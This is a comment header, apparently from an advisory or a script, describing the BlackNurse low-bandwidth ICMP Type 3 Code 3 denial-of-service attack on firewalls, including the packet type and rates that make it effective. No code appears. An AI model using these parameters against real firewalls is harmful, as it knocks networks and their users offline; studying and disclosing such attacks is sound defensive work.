#  Description:
#  Blacknurse is a low bandwidth ICMP attack that is capable of doing denial 
#  of service to well known firewalls. Most ICMP attacks that we see are based 
#  on ICMP Type 8 Code 0 also called a ping flood attack. BlackNurse is based 
#  on ICMP with Type 3 Code 3 packets. We know that when a user has allowed ICMP 
#  Type 3 Code 3 to outside interfaces, the BlackNurse attack becomes highly 
#  effective even at low bandwidth. Low bandwidth is in this case around 15-18 
#  Mbit/s. This is to achieve the volume of packets needed which is around 40 to 
#  50K packets per second. It does not matter if you have a 1 Gbit/s Internet 
#  connection. The impact we see on different firewalls is typically high CPU 
#  loads. When an attack is ongoing, users from the LAN side will no longer be 
#  able to send/receive traffic to/from the Internet. All firewalls we have seen 
#  recover when the attack stops.
